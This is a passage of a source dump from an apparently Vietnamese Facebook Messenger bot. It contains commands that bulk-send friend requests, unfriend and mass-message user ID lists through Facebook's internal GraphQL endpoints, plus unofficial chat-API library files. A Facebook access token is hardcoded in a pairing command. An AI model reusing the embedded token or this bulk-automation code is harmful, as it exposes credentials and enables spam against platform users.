Math.round(Math.random() * 19).toString()\n          },\n          scale: 3\n        })\n      };\n      try {\n        const sendAdd = await api.httpPost('https://www.facebook.com/api/graphql/', form);\n        if (JSON.parse(sendAdd).errors) failed.push(uid);\n        else success.push(uid)\n      }\n      catch(e) {\n        failed.push(uid);\n      };\n    }\n    reply(`¬ª ƒê√£ g·ª≠i l·ªùi m·ªùi k·∫øt b·∫°n th√†nh c√¥ng cho ${success.length} id${failed.length > 0 ? `\\n¬ª G·ª≠i l·ªùi m·ªùi k·∫øt b·∫°n ƒë·∫øn ${failed.length} id th·∫•t b·∫°i: ${failed.join(\" \")}` : \"\"}`);\n  }\n\n\n  else if (type == 'choiceIdSendMessage') {\n    const listID = body.replace(/\\s+/g, \" \").split(\" \");\n    reply(`Nh·∫≠p n·ªôi dung tin nh·∫Øn b·∫°n mu·ªën g·ª≠i cho ${listID.length} user`, (e, info) => {\n      global.client.handleReply.push({\n        name: this.config.name,\n        messageID: info.messageID,\n        author: senderID,\n        listID,\n        type: \"sendMessage\"\n      });\n    })\n  }\n\n\n  else if (type == 'unFriends') {\n    const listID = body.replace(/\\s+/g, \" \").split(\" \");\n    const success = [];\n    const failed = [];\n\n    for (const idUnfriend of listID) {\n      const form = {\n        av: botID,\n        fb_api_req_friendly_name: \"FriendingCometUnfriendMutation\",\n        fb_api_caller_class: \"RelayModern\",\n        doc_id: \"4281078165250156\",\n        variables: JSON.stringify({\n          input: {\n            source: \"bd_profile_button\",\n            unfriended_user_id: idUnfriend,\n            actor_id: botID,\n            client_mutation_id: Math.round(Math.random()*19)\n          },\n          scale:3\n        })\n      };\n      try {\n        const sendAdd = await api.httpPost('https://www.facebook.com/api/graphql/', form);\n        if (JSON.parse(sendAdd).errors) failed.push(`${idUnfriend}: ${JSON.parse(sendAdd).errors[0].summary}`);\n        else success.push(idUnfriend)\n      }\n      catch(e) {\n        failed.push(idUnfriend);\n      };\n    }\n    reply(`¬ª ƒê√£ x√≥a th√†nh c√¥ng ${success.length} b·∫°n b√®${failed.length > 0 ? `\\n¬ª X√≥a th·∫•t b·∫°i ${failed.length} b·∫°n b√®:\\n${failed.join(\"\\n\")}` : \"\"}`);\n  }\n\n\n  else if (type == 'sendMessage') {\n    const listID = handleReply.listID;\n    const success = [];\n    const failed = [];\n    for (const uid of listID) {\n      try {\n        const sendMsg = await api.sendMessage(body, uid);\n        if (!sendMsg.messageID) failed.push(uid);\n        else success.push(uid);\n      }\n      catch(e) {\n        failed.push(uid);\n      }\n    }\n    reply(`¬ª ƒê√£ g·ª≠i tin nh·∫Øn th√†nh c√¥ng cho ${success.length} user${failed.length > 0 ? `\\n¬ª G·ª≠i tin nh·∫Øn ƒë·∫øn ${failed.length} user th·∫•t b·∫°i: ${failed.join(\" \")}` : \"\"}`);\n  }\n\n\n  else if (type == 'acceptFriendRequest' || type == 'deleteFriendRequest') {\n    const listID = body.replace(/\\s+/g, \" \").split(\" \");\n\n    const success = [];\n    const failed = [];\n\n    for (const uid of listID) {\n      const form = {\n        av: botID,\n        fb_api_req_friendly_name: type == 'acceptFriendRequest' ? \"FriendingCometFriendRequestConfirmMutation\" : \"FriendingCometFriendRequestDeleteMutation\",\n        fb_api_caller_class: \"RelayModern\",\n        doc_id: type == 'acceptFriendRequest' ? \"3147613905362928\" : \"4108254489275063\",\n        variables: JSON.stringify({\n          input: {\n            friend_requester_id: uid,\n            source: \"friends_tab\",\n            actor_id: botID,\n            client_mutation_id: Math.round(Math.random() * 19).toString()\n          },\n          scale: 3,\n          refresh_num: 0\n        })\n      };\n      try {\n        const friendRequest = await api.httpPost(\"https://www.facebook.com/api/graphql/\", form);\n        if (JSON.parse(friendRequest).errors) failed.push(uid);\n        else success.push(uid);\n      }\n      catch(e) {\n        failed.push(uid);\n      }\n    }\n    reply(`¬ª ƒê√£ ${type == 'acceptFriendRequest' ? 'ch·∫•p nh·∫≠n' : 'x√≥a'} l·ªùi m·ªùi k·∫øt b   n th√†nh c√¥ng c·ªßa ${success.length} id${failed.length > 0 ? `\\n¬ª Th·∫•t b·∫°i v·ªõi ${failed.length} id: ${failed.join(\" \")}` : \"\"}`);\n  }\n\n\n  else if (type == 'noteCode') {\n    axios({\n      url: 'https://buildtool.dev/verification',\n      method: 'post',\n      data: `content=${encodeURIComponent(body)}&code_class=language${encodeURIComponent('-')}javascript`\n    })\n    .then(response => {\n      const href = response.data.split('<a href=\"code-viewer.php?')[1].split('\">Permanent link</a>')[0];\n      reply(`T·∫°o ghi ch√∫ th√†nh c√¥ng, link: ${'https://buildtool.dev/code-viewer.php?' + href}`)\n    })\n    .catch(err => {\n      reply('ƒê√£ x·∫£y ra l·ªói, vui l√≤ng th·ª≠ l·∫°i sau');\n    })\n  }\n};\n\n\nmodule.exports.run = async ({ event, api, permssion }) => {\n  const { threadID, messageID, senderID } = event;\n  if (permssion != 3) return api.sendMessage( `[DONATE] ‚ûú Momo/Mbbank: 0396049649. Xin c√°m ∆°n ·∫°!! ‚ù§Ô∏è`, event.threadID, event.messageID)\n  api.sendMessage(\"‚öôÔ∏è‚öôÔ∏è Command List ‚öôÔ∏è‚öôÔ∏è\"\n     + \"\\n[01] Ch·ªânh s·ª≠a ti·ªÉu s·ª≠ bot\"\n     + \"\\n[02] Ch·ªânh s·ª≠a t√™n bi·ªát danh c·ªßa bot\"\n     + \"\\n[03] Xem tin nh·∫Øn ƒëang ch·ªù\"\n     + \"\\n[04] Xem tin nh·∫Øn ch∆∞a ƒë·ªçc\"\n     + \"\\n[05] Xem tin nh·∫Øn spam\"\n     + \"\\n[06] ƒê·ªïi avatar bot\"\n     + \"\\n[07] B·∫≠t khi√™n avatar bot <on/off>\"\n     + \"\\n[08] Ch·∫∑n ng∆∞·ªùi d√πng (messenger)\"\n     + \"\\n[09] B·ªè ch·∫∑n ng∆∞·ªùi d√πng (messenger)\"\n     + \"\\n[10] T·∫°o b√†i vi·∫øt\"\n     + \"\\n[11] X√≥a b√†i vi·∫øt\"\n     + \"\\n[12] Comment b√†i vi·∫øt (user)\"\n     + \"\\n[13] Comment b√†i vi·∫øt (group)\"\n     + \"\\n[14] Th·∫£ c·∫£m x√∫c b√†i vi·∫øt\"\n     + \"\\n[15] K·∫øt b·∫°n b·∫±ng id\"\n     + \"\\n[16] Ch·∫•p nh·∫≠n l·ªùi m·ªùi k·∫øt b·∫°n b·∫±ng id\"\n     + \"\\n[17] T·ª´ ch·ªëi l·ªùi m·ªùi k·∫øt b·∫°n b·∫±ng id\"\n     + \"\\n[18] X√≥a b·∫°n b√® b·∫±ng id\"\n     + \"\\n[19] G·ª≠i tin nh·∫Øn b·∫±ng id\"\n     + \"\\n[20] T·∫°o ghi ch√∫ tr√™n buildtool.dev\"\n     + \"\\n[21] ƒêƒÉng xu·∫•t t√†i kho·∫£n\"\n    + \"\\n````````````````````````````````\"\n    + `\\n¬ª Admin ID:\\n${global.config.ADMINBOT.join(\"\\n\")}`\n    + `\\n¬ª Bot ID: ${api.getCurrentUserID()}`\n    + `\\n¬ª H√£y ph·∫£n h·ªìi tin nh·∫Øn n√†y k√®m s·ªë th·ª© t·ª± c·ªßa l·ªánh b·∫°n mu·ªën th·ª±c hi·ªán`\n    + \"\\n````````````````````````````````\", threadID, (err, info) => {\n    global.client.handleReply.push({\n      name: this.config.name,\n      messageID: info.messageID,\n      author: senderID,\n      type: \"menu\"\n    });\n  }, messageID);\n};\n\n\nfunction getGUID() {\n  let _0x161e32 = Date.now(),\n    _0x4ec135 = 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(\n      /[xy]/g,\n      function (_0x32f946) {\n        let _0x141041 = Math.floor((_0x161e32 + Math.random() * 16) % 16)\n        _0x161e32 = Math.floor(_0x161e32 / 16)\n        let _0x31fcdd = (\n          _0x32f946 == 'x' ? _0x141041 : (_0x141041 & 7) | 8\n        ).toString(16)\n        return _0x31fcdd\n      }\n    )\n  return _0x4ec135\n}\n","path":null,"size_bytes":33850,"size_tokens":null},"modules/commands/gh√©p.js":{"content":"module.exports.config = {\n  name: \"gh√©p\",\n  version: \"1.0.0\", \n  hasPermssion: 0,\n  credits: \"D-Jukie (Xuy√™n get)\",\n  description: \"Gh√©p ƒë√¥i\",\n  commandCategory: \"Nh√≥m\", \n  usages: \"gh√©p\", \n  cooldowns: 10\n};\nmodule.exports.run = async function({ api, event,Threads, Users }) {\n        const axios = global.nodemodule[\"axios\"];\n        const fs = global.nodemodule[\"fs-extra\"];\n\n        var { participantIDs } =(await Threads.getData(event.threadID)).threadInfo;\n        var tle = Math.floor(Math.random() * 101);\n        let mung = [\n    \"Ch√∫c 2 b·∫°n trƒÉm nƒÉm h·∫°nh ph√∫t\",\n    \"Ch√∫c 2 b·∫°n x√¢y d·ª±ng ƒë∆∞·ª£c 1 t·ªï ·∫•m h·∫°nh ph√∫c\",\n    \"Ch√∫c 2 b·∫°n c√πng nhau n∆∞∆°ng t·ª±a ƒë·∫øn cu·ªëi ƒë·ªùi\",\n    \"Ch√∫c 2 b·∫°n h·∫°nh ph√∫c\",\n    \"Tr√°ch ph·∫≠n v√¥ duy√™n...\",\n  \"H∆°i th·∫•p nh∆∞ng kh√¥ng sao. H√£y c·ªë g·∫Øng l√™n!\",\n  \"3 ph·∫ßn duy√™n n·ª£, 7 ph·∫ßn c·ªë g·∫Øng\",\n  \"T·ª∑ l·ªá m√† m·ªëi quan h·ªá n√†y c√≥ th·ªÉ n√™n duy√™n c≈©ng kh√° l√† nh·ªè ƒë·∫•y! Ph·∫£i c·ªë g·∫Øng h∆°n n·ªØa\",\n  \"Date v·ªõi nhau ƒëi. ƒê·ªÉ m·ªëi quan h·ªá n√†y c√≥ th·ªÉ ti·∫øn xa h∆°n\",\n  \"H√£y ch·ªß ƒë·ªông b·∫Øt chuy·ªán h∆°n n·ªØa. Hai b·∫°n kh√° l√† h·ª£p ƒë√¥i\",\n  \"H√£y tin v√†o duy√™n s·ªë ƒëi, v√¨ n√≥ c√≥ th·∫≠t ƒë·∫•y!\",\n  \"H·ª£p ƒë√¥i l·∫Øm ƒë·∫•y. Quan t√¢m chƒÉm s√≥c cho m·ªëi quan h·ªá n√†y nhi·ªÅu h∆°n n·ªØa nh√©!\",\n  \"L∆∞u s·ªë nhau ƒëi, bao gi·ªù c∆∞·ªõi th√¨ g·ªçi nhau l√™n l·ªÖ ƒë∆∞·ªùng!\",\n  \"C∆∞·ªõi ƒëi ch·ªù chi!\"\n  ]\n  let chuc = mung[Math.floor(Math.random() * mung.length)]\n        var namee = (await Users.getData(event.senderID)).name\n        const botID = api.getCurrentUserID();\n        const listUserID = event.participantIDs.filter(ID => ID != botID && ID != event.senderID);\n        var id = listUserID[Math.floor(Math.random() * listUserID.length)];\n        var name = (await Users.getData(id)).name\n        var arraytag = [];\n                arraytag.push({id: event.senderID, tag: namee});\n                arraytag.push({id: id, tag: name});\n\n  \n        let Avatar = (await axios.get( `https://graph.facebook.com/${event.senderID}/picture?width=512&height=512&access_token=6628568379%7Cc1e620fa708a1d5696fb991c1bde5662`, { responseType: \"arraybuffer\" } )).data; \n            fs.writeFileSync( __dirname + \"/cache/avt.png\", Buffer.from(Avatar, \"utf-8\") );\n\n        let gifLove = (await axios.get( `https://i.ibb.co/wC2JJBb/trai-tim-lap-lanh.gif`, { responseType: \"arraybuffer\" } )).data; \n            fs.writeFileSync( __dirname + \"/cache/giflove.png\", Buffer.from(gifLove, \"utf-8\") );\n\n        let Avatar2 = (await axios.get( `https://graph.facebook.com/${id}/picture?width=512&height=512&access_token=6628568379%7Cc1e620fa708a1d5696fb991c1bde5662`, { responseType: \"arraybuffer\" } )).data;\n            fs.writeFileSync( __dirname + \"/cache/avt2.png\", Buffer.from(Avatar2, \"utf-8\") );\n\n        var imglove = [];\n              \n              imglove.push(fs.createReadStream(__dirname + \"/cache/avt.png\"));\n              imglove.push(fs.createReadStream(__dirname + \"/cache/giflove.png\"));\n              imglove.push(fs.createReadStream(__dirname + \"/cache/avt2.png\"));\n\n        var msg = {body: `[ü•∞]‚Üí Gh√©p ƒë√¥i th√†nh c√¥ng!\\n[‚ù§Ô∏è]‚Üí L·ªùi ch√∫c:\\n${chuc}\\n[üíï]‚Üí T·ªâ l·ªá h·ª£p ƒë√¥i: ${tle}%\\n`+namee+\" \"+\"üíì\"+\" \"+name, mentions: arraytag, attachment: imglove}\n        return api.sendMessage(msg, event.threadID, event.messageID)\n}","path":null,"size_bytes":3399,"size_tokens":null},"includes/handle/handleRefresh.js":{"content":"module.exports = function ({ api, models, Users, Threads, Currencies }) {\n    const logger = require(\"../../utils/log.js\");\n    return async function ({ event }) {\n        const { threadID, logMessageType, logMessageData } = event;\n        const { setData, getData, delData, createData } = Threads;\n        try {\n            let dataThread = (await getData(threadID)).threadInfo;\n            switch (logMessageType) {\n                case \"log:thread-admins\": {\n                    if (logMessageData.ADMIN_EVENT == \"add_admin\") {\n                        dataThread.adminIDs.push({\n                            id: logMessageData.TARGET_ID\n                        })\n                    } else if (logMessageData.ADMIN_EVENT == \"remove_admin\") {\n                        dataThread.adminIDs = dataThread.adminIDs.filter(item => item.id != logMessageData.TARGET_ID);\n                    }\n                    logger('L√†m m·ªõi list admin t·∫°i nh√≥m ' + threadID, 'UPDATE DATA')\n                    await setData(threadID, { threadInfo: dataThread });\n                    break;\n                }\n                case \"log:thread-name\": {\n                    logger('C·∫≠p nh·∫≠t t√™n t·∫°i nh√≥m ' + threadID, 'UPDATE DATA')\n                    dataThread.threadName = event.logMessageData.name\n                    await setData(threadID, { threadInfo: dataThread });\n                    break;\n                }\n                case \"log:subscribe\": {\n                    if (event.logMessageData.addedParticipants.some(i => i.userFbId == api.getCurrentUserID())) {\n                        await new Promise(resolve => setTimeout(resolve, 2000));\n                        try {\n                            require('./handleCreateDatabase.js');\n                        } catch(e) {\n                            console.log(e)\n                        }\n                        return;\n                    }\n                    break;\n                }\n                \n                case 'log:unsubscribe': {\n                    if (logMessageData.leftParticipantFbId == api.getCurrentUserID()) {\n                        logger('Th·ª±c hi·ªán x√≥a data c·ªßa nh√≥m ' + threadID, 'DELETE DATA')\n                        const index = global.data.allThreadID.findIndex(item => item == threadID);\n                        global.data.allThreadID.splice(index, 1);\n                        await delData(threadID);\n                        return\n                    } else {\n                        const index = dataThread.participantIDs.findIndex(item => item == logMessageData.leftParticipantFbId);\n                        dataThread.participantIDs.splice(index, 1);\n                        if (dataThread.adminIDs.find(i => i.id == logMessageData.leftParticipantFbId)) {\n                            dataThread.adminIDs = dataThread.adminIDs.filter(item => item.id != logMessageData.leftParticipantFbId);\n                        }\n                        logger('Th·ª±c hi·ªán x√≥a user ' + logMessageData.leftParticipantFbId, 'DELETE DATA')\n                        await setData(threadID, { threadInfo: dataThread });\n                    }\n                    break;\n                }\n            }\n        } catch (e) {\n            console.log('ƒê√£ x·∫£y ra l·ªói update data: ' + e)\n        }\n        return;\n    };\n}","path":null,"size_bytes":3315,"size_tokens":null},"lib/fca-auto/src/getThreadList.js":{"content":"\"use strict\";\n\nconst utils = require(\"../utils\");\nconst log = require(\"npmlog\");\n\nfunction createProfileUrl(url, username, id) {\n  if (url) return url;\n  return \"https://www.facebook.com/\" + (username || utils.formatID(id.toString()));\n}\n\nfunction formatParticipants(participants) {\n  return participants.edges.map((p) => {\n    p = p.node.messaging_actor;\n    switch (p[\"__typename\"]) {\n      case \"User\":\n        return {\n          accountType: p[\"__typename\"],\n          userID: utils.formatID(p.id.toString()), // do we need .toString()? when it is not a string?\n          name: p.name,\n          shortName: p.short_name,\n          gender: p.gender,\n          url: p.url, // how about making it profileURL\n          profilePicture: p.big_image_src.uri,\n          username: (p.username || null),\n          // TODO: maybe better names for these?\n          isViewerFriend: p.is_viewer_friend, // true/false\n          isMessengerUser: p.is_messenger_user, // true/false\n          isVerified: p.is_verified, // true/false\n          isMessageBlockedByViewer: p.is_message_blocked_by_viewer, // true/false\n          isViewerCoworker: p.is_viewer_coworker, // true/false\n          isEmployee: p.is_employee // null? when it is something other? can someone check?\n        };\n      case \"Page\":\n        return {\n          accountType: p[\"__typename\"],\n          userID: utils.formatID(p.id.toString()), // or maybe... pageID?\n          name: p.name,\n          url: p.url,\n          profilePicture: p.big_image_src.uri,\n          username: (p.username || null),\n          // uhm... better names maybe?\n          acceptsMessengerUserFeedback: p.accepts_messenger_user_feedback, // true/false\n          isMessengerUser: p.is_messenger_user, // true/false\n          isVerified: p.is_verified, // true/false\n          isMessengerPlatformBot: p.is_messenger_platform_bot, // true/false\n          isMessageBlockedByViewer: p.is_message_blocked_by_viewer, // true/false\n        };\n      case \"ReducedMessagingActor\":\n      case \"UnavailableMessagingActor\":\n        return {\n          accountType: p[\"__typename\"],\n          userID: utils.formatID(p.id.toString()),\n          name: p.name,\n          url: createProfileUrl(p.url, p.username, p.id), // in this case p.url is null all the time\n          profilePicture: p.big_image_src.uri, // in this case it is default facebook photo, we could determine gender using it\n          username: (p.username || null), // maybe we could use it to generate profile URL?\n          isMessageBlockedByViewer: p.is_message_blocked_by_viewer, // true/false\n        };\n      default:\n        log.warn(\"getThreadList\", \"Found participant with unsupported typename. Please open an issue at https://github.com/Schmavery/facebook-chat-api/issues\\n\" + JSON.stringify(p, null, 2));\n        return {\n          accountType: p[\"__typename\"],\n          userID: utils.formatID(p.id.toString()),\n          name: p.name || `[unknown ${p[\"__typename\"]}]`, // probably it will always be something... but fallback to [unknown], just in case\n        };\n    }\n  });\n}\n\n// \"FF8C0077\" -> \"8C0077\"\nfunction formatColor(color) {\n  if (color && color.match(/^(?:[0-9a-fA-F]{8})$/g)) return color.slice(2);\n  return color;\n}\n\nfunction getThreadName(t) {\n  if (t.name || t.thread_key.thread_fbid) return t.name;\n\n  for (let po of t.all_participants.edges) {\n    let p = po.node;\n    if (p.messaging_actor.id === t.thread_key.other_user_id) return p.messaging_actor.name;\n  }\n}\n\nfunction mapNicknames(customizationInfo) {\n  return (customizationInfo && customizationInfo.participant_customizations) ? customizationInfo.participant_customizations.map(u => {\n    return {\n      \"userID\": u.participant_id,\n      \"nickname\": u.nickname\n    };\n  }) : [];\n}\n\nfunction formatThreadList(data) {\n  return data.map(t => {\n    let lastMessageNode = (t.last_message && t.last_message.nodes && t.last_message.nodes.length > 0) ? t.last_message.nodes[0] : null;\n    return {\n      threadID: t.thread_key ? utils.formatID(t.thread_key.thread_fbid || t.thread_key.other_user_id) : null, // shall never be null\n      name: getThreadName(t),\n      unreadCount: t.unread_count,\n      messageCount: t.messages_count,\n      imageSrc: t.image ? t.image.uri : null,\n      emoji: t.customization_info ? t.customization_info.emoji : null,\n      color: formatColor(t.customization_info ? t.customization_info.outgoing_bubble_color : null),\n      nicknames: mapNicknames(t.customization_info),\n      muteUntil: t.mute_until,\n      participants: formatParticipants(t.all_participants),\n      adminIDs: t.thread_admins.map(a => a.id),\n      folder: t.folder,\n      isGroup: t.thread_type === \"GROUP\",\n      // rtc_call_data: t.rtc_call_data, // TODO: format and document this\n      // isPinProtected: t.is_pin_protected, // feature from future? always false (2018-04-04)\n      customizationEnabled: t.customization_enabled, // false for ONE_TO_ONE with Page or ReducedMessagingActor\n      participantAddMode: t.participant_add_mode_as_string, // \"ADD\" if \"GROUP\" and null if \"ONE_TO_ONE\"\n      montageThread: t.montage_thread ? Buffer.from(t.montage_thread.id, \"base64\").toString() : null, // base64 encoded string \"message_thread:0000000000000000\"\n      // it is not userID nor any other ID known to me...\n      // can somebody inspect it? where is it used?\n      // probably Messenger Day uses it\n      reactionsMuteMode: t.reactions_mute_mode,\n      mentionsMuteMode: t.mentions_mute_mode,\n      isArchived: t.has_viewer_archived,\n      isSubscribed: t.is_viewer_subscribed,\n      timestamp: t.updated_time_precise, // in miliseconds\n      // isCanonicalUser: t.is_canonical_neo_user, // is it always false?\n      // TODO: how about putting snippet in another object? current implementation does not handle every possibile message type etc.\n      snippet: lastMessageNode ? lastMessageNode.snippet : null,\n      snippetAttachments: lastMessageNode ? lastMessageNode.extensible_attachment : null, // TODO: not sure if it works\n      snippetSender: lastMessageNode ? utils.formatID((lastMessageNode.message_sender.messaging_actor.id || \"\").toString()) : null,\n      lastMessageTimestamp: lastMessageNode ? lastMessageNode.timestamp_precise : null, // timestamp in miliseconds\n      lastReadTimestamp: (t.last_read_receipt && t.last_read_receipt.nodes.length > 0)\n        ? (t.last_read_receipt.nodes[0] ? t.last_read_receipt.nodes[0].timestamp_precise : null)\n        : null, // timestamp in miliseconds\n      cannotReplyReason: t.cannot_reply_reason, // TODO: inspect possible values\n      approvalMode: Boolean(t.approval_mode),\n\n      // @Legacy\n      participantIDs: formatParticipants(t.all_participants).map(participant => participant.userID),\n      threadType: t.thread_type === \"GROUP\" ? 2 : 1 // \"GROUP\" or \"ONE_TO_ONE\"\n    };\n  });\n}\n\nmodule.exports = function (defaultFuncs, api, ctx) {\n  return function getThreadList(limit, timestamp, tags, callback) {\n    if (!callback && (utils.getType(tags) === \"Function\" || utils.getType(tags) === \"AsyncFunction\")) {\n      callback = tags;\n      tags = [\"\"];\n    }\n    if (utils.getType(limit) !== \"Number\" || !Number.isInteger(limit) || limit <= 0) throw { error: \"getThreadList: limit must be a positive integer\" };\n\n    if (utils.getType(timestamp) !== \"Null\" && (utils.getType(timestamp) !== \"Number\" || !Number.isInteger(timestamp))) throw { error: \"getThreadList: timestamp must be an integer or null\" };\n\n    if (utils.getType(tags) === \"String\") tags = [tags];\n    if (utils.getType(tags) !== \"Array\") throw { error: \"getThreadList: tags must be an array\" };\n\n    var resolveFunc = function () { };\n    var rejectFunc = function () { };\n    var returnPromise = new Promise(function (resolve, reject) {\n      resolveFunc = resolve;\n      rejectFunc = reject;\n    });\n\n    if (utils.getType(callback) !== \"Function\" && utils.getType(callback) !== \"AsyncFunction\") {\n      callback = function (err, data) {\n        if (err) return rejectFunc(err);\n        resolveFunc(data);\n      };\n    }\n\n    const form = {\n      \"av\": ctx.globalOptions.pageID,\n      \"queries\": JSON.stringify({\n        \"o0\": {\n          // This doc_id was valid on 2020-07-20\n          \"doc_id\": \"3336396659757871\",\n          \"query_params\": {\n            \"limit\": limit + (timestamp ? 1 : 0),\n            \"before\": timestamp,\n            \"tags\": tags,\n            \"includeDeliveryReceipts\": true,\n            \"includeSeqID\": false\n          }\n        }\n      }),\n      \"batch_name\": \"MessengerGraphQLThreadlistFetcher\"\n    };\n\n    defaultFuncs\n      .post(\"https://www.facebook.com/api/graphqlbatch/\", ctx.jar, form)\n      .then(utils.parseAndCheckLogin(ctx, defaultFuncs))\n      .then((resData) => {\n        if (resData[resData.length - 1].error_results > 0) throw resData[0].o0.errors;\n\n        if (resData[resData.length - 1].successful_results === 0) throw { error: \"getThreadList: there was no successful_results\", res: resData };\n\n        // When we ask for threads using timestamp from the previous request,\n        // we are getting the last thread repeated as the first thread in this response.\n        // .shift() gets rid of it\n        // It is also the reason for increasing limit by 1 when timestamp is set\n        // this way user asks for 10 threads, we are asking for 11,\n        // but after removing the duplicated one, it is again 10\n        if (timestamp) resData[0].o0.data.viewer.message_threads.nodes.shift();\n\n        callback(null, formatThreadList(resData[0].o0.data.viewer.message_threads.nodes));\n      })\n      .catch((err) => {\n        log.error(\"getThreadList\", \"L·ªói: getThreadList C√≥ Th·ªÉ Do B·∫°n Spam Qu√° Nhi·ªÅu, H√£y Th·ª≠ L·∫°i !\");\n        return callback(err);\n      });\n\n    return returnPromise;\n  };\n};\n","path":null,"size_bytes":9746,"size_tokens":null},"modules/events/timejoin.js":{"content":"module.exports.config = {\n  name: \"timejoin\",\n  eventType: [\"log:unsubscribe\"],\n  version: \"1.0.2\",\n  credits: \"TatsuYTB\",\n  description: \"T·ª± x√≥a data time join user khi out (h·ªó tr·ª£ nhi·ªÅu ng∆∞·ªùi)\"\n};\n\nconst fs = require(\"fs-extra\");\nconst path = require(\"path\");\nconst dir = path.join(__dirname, \"../commands/cache/timejoin\");\n\nmodule.exports.run = async function({ event }) {\n  const { threadID, logMessageData } = event;\n  let usersLeft = [];\n\n  if (logMessageData.leftParticipantFbId) {\n    usersLeft.push(logMessageData.leftParticipantFbId);\n  }\n  if (logMessageData.leftParticipantFbIds && Array.isArray(logMessageData.leftParticipantFbIds)) {\n    usersLeft = usersLeft.concat(logMessageData.leftParticipantFbIds);\n  }\n\n  if (usersLeft.length === 0) return; \n\n  const pathFile = path.join(dir, threadID + \".json\");\n  if (!fs.existsSync(pathFile)) return; \n\n  let data = JSON.parse(fs.readFileSync(pathFile, \"utf-8\"));\n\n  data = data.filter(u => !usersLeft.includes(u.senderID));\n\n  fs.writeFileSync(pathFile, JSON.stringify(data, null, 4), \"utf-8\");\n};\n","path":null,"size_bytes":1069,"size_tokens":null},"lib/Fca-Horizon-Remastered/src/changeAdminStatus.js":{"content":"\"use strict\";\n\nconst utils = require(\"../utils\");\nconst log = require(\"npmlog\");\n\nmodule.exports = function(defaultFuncs, api, ctx) {\n  return function changeAdminStatus(threadID, adminIDs, adminStatus, callback) {\n    if (utils.getType(threadID) !== \"String\") {\n      throw {error: \"changeAdminStatus: threadID must be a string\"};\n    }\n\n    if (utils.getType(adminIDs) === \"String\") {\n      adminIDs = [adminIDs];\n    }\n\n    if (utils.getType(adminIDs) !== \"Array\") {\n      throw {error: \"changeAdminStatus: adminIDs must be an array or string\"};\n    }\n\n    if (utils.getType(adminStatus) !== \"Boolean\") {\n      throw {error: \"changeAdminStatus: adminStatus must be a string\"};\n    }\n\n    var resolveFunc = function(){};\n    var rejectFunc = function(){};\n    var returnPromise = new Promise(function (resolve, reject) {\n      resolveFunc = resolve;\n      rejectFunc = reject;\n    });\n\n    if (!callback) {\n      callback = function (err) {\n        if (err) {\n          return rejectFunc(err);\n        }\n        resolveFunc();\n      };\n    }\n\n    if (utils.getType(callback) !== \"Function\" && utils.getType(callback) !== \"AsyncFunction\") {\n      throw {error: \"changeAdminStatus: callback is not a function\"};\n    }\n\n    let form = {\n      \"thread_fbid\": threadID,\n    };\n\n    let i = 0;\n    for (let u of adminIDs) {\n      form[`admin_ids[${i++}]`] = u;\n    }\n    form[\"add\"] = adminStatus;\n\n    defaultFuncs\n      .post(\"https://www.facebook.com/messaging/save_admins/?dpr=1\", ctx.jar, form)\n      .then(utils.parseAndCheckLogin(ctx, defaultFuncs))\n      .then(function(resData) {\n        if (resData.error) {\n          switch (resData.error) {\n            case 1976004:\n              throw { error: \"Cannot alter admin status: you are not an admin.\", rawResponse: resData };\n            case 1357031:\n              throw { error: \"Cannot alter admin status: this thread is not a group chat.\", rawResponse: resData };\n            default:\n              throw { error: \"Cannot alter admin status: unknown error.\", rawResponse: resData };\n          }\n        }\n\n        callback();\n      })\n      .catch(function(err) {\n        log.error(\"changeAdminStatus\", err);\n        return callback(err);\n      });\n      \n    return returnPromise;\n  };\n};\n\n","path":null,"size_bytes":2249,"size_tokens":null},"lib/Fca-Horizon-Remastered/src/getThreadList.js":{"content":"\"use strict\";\n\nconst utils = require(\"../utils\");\nconst log = require(\"npmlog\");\n\nfunction createProfileUrl(url, username, id) {\n  if (url) return url;\n  return \"https://www.facebook.com/\" + (username || utils.formatID(id.toString()));\n}\n\nfunction formatParticipants(participants) {\n  return participants.edges.map((p) => {\n    p = p.node.messaging_actor;\n    switch (p[\"__typename\"]) {\n      case \"User\":\n        return {\n          accountType: p[\"__typename\"],\n          userID: utils.formatID(p.id.toString()), // do we need .toString()? when it is not a string?\n          name: p.name,\n          shortName: p.short_name,\n          gender: p.gender,\n          url: p.url, // how about making it profileURL\n          profilePicture: p.big_image_src.uri,\n          username: (p.username || null),\n          // TODO: maybe better names for these?\n          isViewerFriend: p.is_viewer_friend, // true/false\n          isMessengerUser: p.is_messenger_user, // true/false\n          isVerified: p.is_verified, // true/false\n          isMessageBlockedByViewer: p.is_message_blocked_by_viewer, // true/false\n          isViewerCoworker: p.is_viewer_coworker, // true/false\n          isEmployee: p.is_employee // null? when it is something other? can someone check?\n        };\n      case \"Page\":\n        return {\n          accountType: p[\"__typename\"],\n          userID: utils.formatID(p.id.toString()), // or maybe... pageID?\n          name: p.name,\n          url: p.url,\n          profilePicture: p.big_image_src.uri,\n          username: (p.username || null),\n          // uhm... better names maybe?\n          acceptsMessengerUserFeedback: p.accepts_messenger_user_feedback, // true/false\n          isMessengerUser: p.is_messenger_user, // true/false\n          isVerified: p.is_verified, // true/false\n          isMessengerPlatformBot: p.is_messenger_platform_bot, // true/false\n          isMessageBlockedByViewer: p.is_message_blocked_by_viewer, // true/false\n        };\n      case \"ReducedMessagingActor\":\n      case \"UnavailableMessagingActor\":\n        return {\n          accountType: p[\"__typename\"],\n          userID: utils.formatID(p.id.toString()),\n          name: p.name,\n          url: createProfileUrl(p.url, p.username, p.id), // in this case p.url is null all the time\n          profilePicture: p.big_image_src.uri, // in this case it is default facebook photo, we could determine gender using it\n          username: (p.username || null), // maybe we could use it to generate profile URL?\n          isMessageBlockedByViewer: p.is_message_blocked_by_viewer, // true/false\n        };\n      default:\n        log.warn(\"getThreadList\", \"Found participant with unsupported typename. Please open an issue at https://github.com/Schmavery/facebook-chat-api/issues\\n\" + JSON.stringify(p, null, 2));\n        return {\n          accountType: p[\"__typename\"],\n          userID: utils.formatID(p.id.toString()),\n          name: p.name || `[unknown ${p[\"__typename\"]}]`, // probably it will always be something... but fallback to [unknown], just in case\n        };\n    }\n  });\n}\n\n// \"FF8C0077\" -> \"8C0077\"\nfunction formatColor(color) {\n  if (color && color.match(/^(?:[0-9a-fA-F]{8})$/g)) return color.slice(2);\n  return color;\n}\n\nfunction getThreadName(t) {\n  if (t.name || t.thread_key.thread_fbid) return t.name;\n\n  for (let po of t.all_participants.edges) {\n    let p = po.node;\n    if (p.messaging_actor.id === t.thread_key.other_user_id) return p.messaging_actor.name;\n  }\n}\n\nfunction 